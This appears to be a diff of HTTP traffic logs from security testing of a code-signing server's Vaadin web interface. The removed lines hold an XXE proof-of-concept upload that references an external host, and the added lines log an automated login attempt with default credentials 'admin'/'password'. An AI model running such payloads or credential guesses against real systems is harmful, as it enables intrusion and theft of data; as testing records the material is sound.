@@ -1,55 +1,107 @@
-POST https://10.135.51.72:443/css/ui/APP/UPLOAD/0/284/action/2e4ff82a-99e9-41d5-be46-7bbf197d2f04
+POST https://10.135.51.72:443/css/ui?v-1580420017
 Host: 10.135.51.72
-Connection: close
-Content-Length: 1273
-Cache-Control: max-age=0
-Origin: https://10.135.51.72
-Upgrade-Insecure-Requests: 1
-DNT: 1
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOvu0AnxbNACLvlrM
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36
-Sec-Fetch-User: ?1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: nested-navigate
-Referer: https://10.135.51.72/css/ui
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
 Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9,ru;q=0.8
-Cookie: JSESSIONID=ngKuPoKntq2uMGcAPbZQk2ehnHsqa_aAbAlyKG_P.localhost
+Content-type: application/x-www-form-urlencoded
+Content-Length: 288
+Origin: https://10.135.51.72
+Connection: close
+Referer: https://10.135.51.72/css/ui
+Cache-Control: max-age=0
 
-------WebKitFormBoundaryOvu0AnxbNACLvlrM
-Content-Disposition: form-data; name="284_file"; filename="poc3.txt"
-Content-Type: text/plain
-
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY sp SYSTEM "http://10.42.27.102:444/poc3">
-]>
-<r>&sp;</r>
-<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal.dotm</Template><TotalTime>0</TotalTime><Pages>1</Pages><Words>1</Words><Characters>6</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><HeadingPairs><vt:vector size="2" baseType="variant"><vt:variant><vt:lpstr>Title</vt:lpstr></vt:variant><vt:variant><vt:i4>1</vt:i4></vt:variant></vt:vector></HeadingPairs><TitlesOfParts><vt:vector size="1" baseType="lpstr"><vt:lpstr></vt:lpstr></vt:vector></TitlesOfParts><Company></Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>6</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>
-
-------WebKitFormBoundaryOvu0AnxbNACLvlrM--
+b'v-browserDetails=1&theme=mytheme&v-appId=cssui-94968791&v-sh=1050&v-sw=1680&v-cw=1680&v-ch=746&v-curdate=1580420017&v-tzo=300&v-dstd=60&v-rtzo=300&v-dston=false&v-tzid=America%2FNew_York&v-vw=1680&v-vh=0&v-loc=https%3A%2F%2F10.135.51.72%2Fcss%2Fui&v-wn=cssui-94968791-0.781441198235946'
 ---------------------
-b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>500 Internal Server Error</title>\n</head><body>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error or\nmisconfiguration and was unable to complete\nyour request.</p>\n<p>Please contact the server administrator at \n root@localhost to inform them of the time this error occurred,\n and the actions you performed just before this error.</p>\n<p>More information about this error may be available\nin the server error log.</p>\n</body></html>\n'
+b'{"v-uiId":0,"uidl":"{\\"Vaadin-Security-Key\\":\\"b38129e8-aa2e-46c6-9e1e-d8b10cf658ea\\",\\"Vaadin-Push-ID\\":\\"d12fd9f6-e164-40e0-b826-b1f7f439b2f1\\",\\"syncId\\": 0, \\"resynchronize\\": true, \\"clientId\\": 0, \\"changes\\" : [[\\"change\\",{\\"pid\\":\\"0\\"},[\\"0\\",{\\"id\\":\\"0\\"}]]], \\"state\\":{\\"0\\":{\\"localeServiceState\\":{\\"localeData\\":[{\\"name\\":\\"en_CA\\",\\"monthNames\\":[\\"January\\",\\"February\\",\\"March\\",\\"April\\",\\"May\\",\\"June\\",\\"July\\",\\"August\\",\\"September\\",\\"October\\",\\"November\\",\\"December\\"],\\"shortMonthNames\\":[\\"Jan\\",\\"Feb\\",\\"Mar\\",\\"Apr\\",\\"May\\",\\"Jun\\",\\"Jul\\",\\"Aug\\",\\"Sep\\",\\"Oct\\",\\"Nov\\",\\"Dec\\"],\\"shortDayNames\\":[\\"Sun\\",\\"Mon\\",\\"Tue\\",\\"Wed\\",\\"Thu\\",\\"Fri\\",\\"Sat\\"],\\"dayNames\\":[\\"Sunday\\",\\"Monday\\",\\"Tuesday\\",\\"Wednesday\\",\\"Thursday\\",\\"Friday\\",\\"Saturday\\"],\\"firstDayOfWeek\\":0,\\"dateFormat\\":\\"dd/MM/yy\\",\\"twelveHourClock\\":true,\\"hourMinuteDelimiter\\":\\":\\",\\"am\\":\\"AM\\",\\"pm\\":\\"PM\\"}]},\\"theme\\":\\"mytheme\\",\\"height\\":\\"100.0%\\",\\"width\\":\\"100.0%\\",\\"registeredEventListeners\\":[\\"clientConnectorDetach\\"]},\\"1\\":{\\"childData\\":{\\"2\\":{\\"alignmentBitmask\\":48,\\"expandRatio\\":0}},\\"height\\":\\"100.0%\\",\\"width\\":\\"100.0%\\"},\\"10\\":{\\"userNameFieldConnector\\":\\"12\\",\\"passwordFieldConnector\\":\\"13\\",\\"loginButtonConnector\\":\\"14\\",\\"resources\\":{\\"loginForm\\":{\\"uRL\\":\\"app://APP/connector/0/10/loginForm/loginForm\\"}}},\\"11\\":{\\"childData\\":{\\"12\\":{\\"alignmentBitmask\\":5,\\"expandRatio\\":0},\\"13\\":{\\"alignmentBitmask\\":5,\\"expandRatio\\":0},\\"14\\":{\\"alignmentBitmask\\":10,\\"expandRatio\\":0}},\\"width\\":\\"300.0px\\",\\"styles\\":[\\"login-form\\"]},\\"12\\":{\\"width\\":\\"100.0%\\",\\"caption\\":\\"Username\\",\\"styles\\":[\\"user-name\\"]},\\"13\\":{\\"width\\":\\"100.0%\\",\\"caption\\":\\"Password\\",\\"styles\\":[\\"user-login-password\\"]},\\"14\\":{\\"width\\":\\"35.0%\\",\\"caption\\":\\"Login\\",\\"styles\\":[\\"primary\\",\\"login-button\\"]},\\"15\\":{\\"text\\":\\"Code Signing Server v1.0\\",\\"styles\\":[\\"application-name-version-login\\"]},\\"2\\":{\\"spacing\\":true,\\"childData\\":{\\"15\\":{\\"alignmentBitmask\\":48,\\"expandRatio\\":0},\\"3\\":{\\"alignmentBitmask\\":5,\\"expandRatio\\":0},\\"5\\":{\\"alignmentBitmask\\":5,\\"expandRatio\\":1}},\\"height\\":\\"550.0px\\",\\"width\\":\\"650.0px\\",\\"styles\\":[\\"login-area\\"]},\\"3\\":{\\"spacing\\":true,\\"childData\\":{\\"4\\":{\\"alignmentBitmask\\":5,\\"expandRatio\\":0}}},\\"4\\":{\\"height\\":\\"77.0px\\",\\"resources\\":{\\"source\\":{\\"uRL\\":\\"theme://img/certicom_BlackBerry_Subsidiary__Identity_UPDATED-02.png\\"}}},\\"5\\":{\\"childData\\":{\\"9\\":{\\"alignmentBitmask\\":5,\\"expandRatio\\":1}},\\"height\\":\\"100.0%\\",\\"width\\":\\"100.0%\\",\\"styles\\":[\\"login-form-area\\"]},\\"9\\":{\\"childData\\":{\\"10\\":{\\"alignmentBitmask\\":48,\\"expandRatio\\":0}},\\"height\\":\\"100.0%\\",\\"width\\":\\"100.0%\\"}}, \\"types\\":{\\"0\\":\\"0\\",\\"1\\":\\"7\\",\\"10\\":\\"8\\",\\"11\\":\\"2\\",\\"12\\":\\"3\\",\\"13\\":\\"9\\",\\"14\\":\\"4\\",\\"15\\":\\"5\\",\\"2\\":\\"2\\",\\"3\\":\\"1\\",\\"4\\":\\"6\\",\\"5\\":\\"2\\",\\"9\\":\\"2\\"}, \\"hierarchy\\":{\\"0\\":[\\"1\\"],\\"1\\":[\\"2\\"],\\"10\\":[\\"11\\"],\\"11\\":[\\"12\\",\\"13\\",\\"14\\"],\\"2\\":[\\"3\\",\\"5\\",\\"15\\"],\\"3\\":[\\"4\\"],\\"5\\":[\\"9\\"],\\"9\\":[\\"10\\"]}, \\"rpc\\" : [], \\"meta\\" : {\\"repaintAll\\":true}, \\"resources\\" : {}, \\"typeMappings\\" : { \\"com.vaadin.ui.HorizontalLayout\\" : 1 , \\"com.vaadin.ui.AbstractFocusable\\" : 10 , \\"com.vaadin.ui.AbstractOrderedLayout\\" : 11 , \\"com.vaadin.ui.AbstractLayout\\" : 12 , \\"com.vaadin.ui.AbstractComponentContainer\\" : 13 , \\"com.vaadin.ui.Button\\" : 4 , \\"com.vaadin.ui.Image\\" : 6 , \\"com.vaadin.ui.PasswordField\\" : 9 , \\"com.vaadin.ui.AbstractSingleComponentContainer\\" : 14 , \\"com.vaadin.ui.LoginForm\\" : 15 , \\"com.vaadin.ui.AbstractComponent\\" : 16 , \\"com.vaadin.server.AbstractClientConnector\\" : 17 , \\"com.certicom.css.ui.login.LoginFormDesign\\" : 8 , \\"com.vaadin.ui.AbstractEmbedded\\" : 18 , \\"com.vaadin.ui.TextField\\" : 3 , \\"com.certicom.css.ui.screens.LoginScreenDesign\\" : 19 , \\"com.vaadin.ui.Label\\" : 5 , \\"com.certicom.css.ui.CssUI\\" : 0 , \\"com.vaadin.ui.VerticalLayout\\" : 2 , \\"com.vaadin.ui.AbstractField\\" : 20 , \\"com.vaadin.ui.AbstractTextField\\" : 21 , \\"com.vaadin.ui.UI\\" : 22 , \\"com.certicom.css.ui.screens.LoginScreen\\" : 7 }, \\"typeInheritanceMap\\" : { \\"1\\" : 11 , \\"10\\" : 16 , \\"11\\" : 12 , \\"12\\" : 13 , \\"13\\" : 16 , \\"4\\" : 10 , \\"6\\" : 18 , \\"9\\" : 3 , \\"14\\" : 16 , \\"15\\" : 14 , \\"16\\" : 17 , \\"8\\" : 15 , \\"18\\" : 16 , \\"3\\" : 21 , \\"19\\" : 2 , \\"5\\" : 16 , \\"0\\" : 22 , \\"2\\" : 11 , \\"20\\" : 16 , \\"21\\" : 20 , \\"22\\" : 14 , \\"7\\" : 19 }}"}'
 ======================
 POST https://10.135.51.72:443/css/ui/UIDL/?v-uiId=0
 Host: 10.135.51.72
-Connection: close
-Content-Length: 149
-Origin: https://10.135.51.72
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36
-DNT: 1
-Content-Type: application/json; charset=UTF-8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
 Accept: */*
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Referer: https://10.135.51.72/css/ui
+Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
 Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9,ru;q=0.8
-Cookie: JSESSIONID=ngKuPoKntq2uMGcAPbZQk2ehnHsqa_aAbAlyKG_P.localhost
+Content-Type: application/json; charset=UTF-8
+Content-Length: 180
+Origin: https://10.135.51.72
+Connection: close
+Referer: https://10.135.51.72/css/ui
+Cookie: JSESSIONID=Bmj4vNn93fuxK3OoRdiIZtKhWFNzG9MY6l9IhVmL.localhost
 
-{"csrfToken":"66f8b74b-8792-4d70-8af6-ab241fc77847","rpc":[["284","com.vaadin.shared.ui.upload.UploadServerRpc","poll",[]]],"syncId":8,"clientId":8}
+b'{"csrfToken":"b38129e8-aa2e-46c6-9e1e-d8b10cf658ea","rpc":[["13","com.vaadin.shared.ui.textfield.AbstractTextFieldServerRpc","setText",["admin",5]]],"syncId":0,"clientId":0}'
 ---------------------
-b'for(;;);[{"changes":{},"resources":{},"locales":{},"meta":{"appError":{"caption":"Session Expired","url":null,"message":"Take note of any unsaved data, and <u>click here</u> or press ESC key to continue.","details":null}},"syncId":-1}]'
+b'for(;;);[{"syncId": 1, "clientId": 1, "changes" : [], "state":{}, "types":{"13":"9"}, "hierarchy":{"13":[]}, "rpc" : [], "meta" : {}, "resources" : {}}]'
 ======================
+POST https://10.135.51.72:443/css/ui/UIDL/?v-uiId=0
+Host: 10.135.51.72
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/json; charset=UTF-8
+Content-Length: 179
+Origin: https://10.135.51.72
+Connection: close
+Referer: https://10.135.51.72/css/ui
+Cookie: JSESSIONID=Bmj4vNn93fuxK3OoRdiIZtKhWFNzG9MY6l9IhVmL.localhost
+
+b'{"csrfToken":"b38129e8-aa2e-46c6-9e1e-d8b10cf658ea","rpc":[["12","com.vaadin.shared.ui.textfield.AbstractTextFieldServerRpc","setText",["password",8]]],"syncId":1,"clientId":1}'
+---------------------
+b'for(;;);[{"syncId": 2, "clientId": 2, "changes" : [], "state":{}, "types":{"12":"3"}, "hierarchy":{"12":[]}, "rpc" : [], "meta" : {}, "resources" : {}}]'
+======================
+POST https://10.135.51.72:443/css/ui/UIDL/?v-uiId=0
+Host: 10.135.51.72
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/json; charset=UTF-8
+Content-Length: 296
+Origin: https://10.135.51.72
+Connection: close
+Referer: https://10.135.51.72/css/ui
+Cookie: JSESSIONID=Bmj4vNn93fuxK3OoRdiIZtKhWFNzG9MY6l9IhVmL.localhost
+
+b'{"csrfToken":"b38129e8-aa2e-46c6-9e1e-d8b10cf658ea","rpc":[["14","com.vaadin.shared.ui.button.ButtonServerRpc","click",[{"altKey":false,"button":"LEFT","clientX":943,"clientY":503,"ctrlKey":false,"metaKey":false,"relativeX":58,"relativeY":23,"shiftKey":false,"type":1}]]],"syncId":2,"clientId":2}'
+---------------------
+b'for(;;);[{"syncId": 3, "clientId": 3, "changes" : [], "state":{}, "types":{}, "hierarchy":{}, "rpc" : [], "meta" : {}, "resources" : {}}]'
+======================
+POST https://10.135.51.72:443/css/ui/APP/connector/0/10/loginForm/loginForm
+Host: 10.135.51.72
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40
+Origin: https://10.135.51.72
+Connection: close
+Referer: https://10.135.51.72/css/ui
+Cookie: JSESSIONID=Bmj4vNn93fuxK3OoRdiIZtKhWFNzG9MY6l9IhVmL.localhost
+Upgrade-Insecure-Requests: 1
+
+b'username=admin&password=password'
+---------------------
+b'<html>Success</html>'
+======================
+POST https://10.135.51.72:443/css/ui/UIDL/?v-uiId=0
+Host: 10.135.51.72
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/json; charset=UTF-8
+Content-Length: 159
+Origin: https://10.135.51.72
+Connection: close
+Referer: https://10.135.51.72/css/ui
+Cookie: JSESSIONID=Bmj4vNn93fuxK3OoRdiIZtKhWFNzG9MY6l9IhVmL.localhost
+
+b'{"csrfToken":"b38129e8-aa2e-46c6-9e1e-d8b10cf658ea","rpc":[["10","com.vaadin.shared.ui.loginform.LoginFormRpc","submitCompleted",[]]],"syncId":3,"clientId":3}'
+---------------------
+b'for(;;);[{"syncId": 4, "clientId": 4, "changes" : [["change",{"pid":"0"},["0",{"id":"0"}]]], "state":{"16":{"caption":"Invalid credentials","styleName":"error","delay":-1}}, "types":{"0":"0","16":"23"}, "hierarchy":{"0":["1","16"]}, "rpc" : [], "meta" : {}, "resources" : {}, "typeMappings" : { "com.vaadin.ui.Notification" : 23 , "com.vaadin.server.AbstractExtension" : 24 }, "typeInheritanceMap" : { "23" : 24 , "0" : 22 , "24" : 17 , "22" : 14 , "14" : 16 , "16" : 17 }}]'
+======================
+
+
+********************************************** End of the iteration **********************************************
+
